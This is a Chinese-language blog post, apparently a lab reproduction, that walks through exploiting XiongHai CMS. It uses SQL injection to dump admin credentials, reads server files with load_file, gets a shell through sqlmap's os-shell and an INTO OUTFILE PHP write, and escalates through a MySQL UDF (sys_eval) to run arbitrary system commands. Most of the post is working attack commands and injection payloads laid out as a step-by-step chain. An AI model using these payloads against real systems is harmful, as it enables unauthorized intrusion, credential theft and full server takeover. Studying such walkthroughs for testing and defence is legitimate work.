---
title: SQL注入以及UDF提权
tags:
  - 漏洞复现
  - sql注入
categories: 技术分享
abbrlink: 27651eb5
date: 2019-10-28 17:30:48
updated: 2019-10-28 17:30:48
---

**熊海CMS的SQL注入以及后续的UDF提权**<!--more-->

### SQL注入

后台登录界面存在sql注入，可抓包后放到sqlmap跑![](https://i.loli.net/2019/10/28/EQmeRBvlMpLbo9a.png)

可获取到管理员密码

```
sqlmap -r 1.txt -D isea -T manage -C name,password --dump
```

![](https://i.loli.net/2019/10/28/OcJSzXi1tBlGWf9.png)

登陆到后台后还存在union联合注入

```
http://10.1.1.11/admin/?r=editcolumn&type=1&id=1' and 1=2 union select 1,2,3,4,5,6,7,8,9,10--+
```

![](https://i.loli.net/2019/10/28/JpGQmZsozfcMS4j.png)

构造注入语句

```
http://10.1.1.11/admin/?r=editcolumn&type=1&id=1' and 1=2 union select 1,version(),user(),@@datadir,5,database(),7,password,9,10 from manage--+
```

![](https://i.loli.net/2019/10/28/afdbNP5roHG7jwU.png)

### GetShell

通过sqlmap读取配置文件获取网站绝对路径

```
sqlmap -r 1.txt --file-read /etc/httpd/conf/httpd.conf
```

![](https://i.loli.net/2019/10/28/kiuISv2Kxoc9Mnr.png)

也可构造load_file()读取文件

```
http://10.1.1.11/admin/?r=editcolumn&type=1&id=1' and 1=2 union select 1,2,3,4,5,6,7,load_file('/etc/httpd/conf/httpd.conf'),9,10--+
```

![](https://i.loli.net/2019/10/28/UQXgjxoNWD14e8f.png)



###### 获取到绝对路径后可以使用sqlmap获取os-shell

PS:获取到绝对路径后并没根目录的权限，但子目录有权限

![](https://i.loli.net/2019/10/28/VhPavUCYJzTDp1O.png)

```
sqlmap -r 1.txt --os-shell     
```

![](https://i.loli.net/2019/10/28/KjVMJHvdeyq13Fz.png)

输入网站类型和路径，即可获取os-shell

![](https://i.loli.net/2019/10/28/WAbHmzN1dcyGYwa.png)

sqlmap会上传两个页面，前者为文件上传，后者为命令执行执行

![前者](https://i.loli.net/2019/10/28/YfMyDHwOKrIG4Z3.png)





![后者](https://i.loli.net/2019/10/28/IQHG2kfqnND18Wm.png)

可以利用文件上传页面上传其他shell，获得更好的体验

###### 或者构造into outfile写shell

```
http://10.1.1.11/admin/?r=editcolumn&type=1&id=1' and 1=2 union select 1,2,3,4,5,6,7,8,'<?php phpinfo();?>',10 into outfile '/var/www/html/xcxmiku/images/xcx.php'--+
```

![](https://i.loli.net/2019/10/28/4MOEnLU1o28DNZB.png)

### UDF提权

此时shell的权限为 apache ![](https://i.loli.net/2019/10/28/sNPFq6QWzpvMykT.png)

使用UDF提权可将将MYSQL账号root转化为系统system权限，从而执行系统任意命令 

###### UDF获取

在msf的/usr/share/metasploit-framework/data/exploits/mysql目录下

![](https://i.loli.net/2019/10/28/wJteD3chuvo2mYC.png)

也可在[github](https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql)上获取

dll对应Windows，so对应Linux

使用sqlmap --sql-shell 获取 mysql root密码

5.6及以下版本执行

```
select host,user,password from mysql.user;
```

5.7及以上版本执行

```
select host,user,authentication_string from mysql.user;
```

![](https://i.loli.net/2019/10/28/Bik34rAhfHEOuTw.png)

我这里为空密码



使用蚁剑连接数据库获取必要信息

```
select @@version_compile_machine,@@plugin_dir;
```

![](https://i.loli.net/2019/10/28/upzlc9hDC1bw5UV.png)

操作系统为64位，Plugin文件夹 在/usr/lib64/mysql/plugin

###### UDF上传

使用蚁剑将 lib_mysqludf_sys_64.so 上传至 /usr/lib64/mysql/plugin

![](https://i.loli.net/2019/10/28/qpBoUnaY63bMg5L.png)

安装UDF

```
create function sys_eval returns string soname 'lib_mysqludf_sys_64.so';
```

![](https://i.loli.net/2019/10/28/ea6oKxGQXcYlkb1.png)

这里我们选择sys_eval函数，此函数可执行系统命令并回显

验证

```
select * from mysql.func where name = 'sys_eval';
```

![](https://i.loli.net/2019/10/28/E2xOmUy1vaWu3VY.png)

利用

```
select sys_eval('whoami');
```

![](https://i.loli.net/2019/10/28/XKLWDGoQNv9EH5a.png)

通过sys_eval即可执行任意系统命令





PS: 记得用完删除文件和udf定义，删除语句为drop function sys_eval;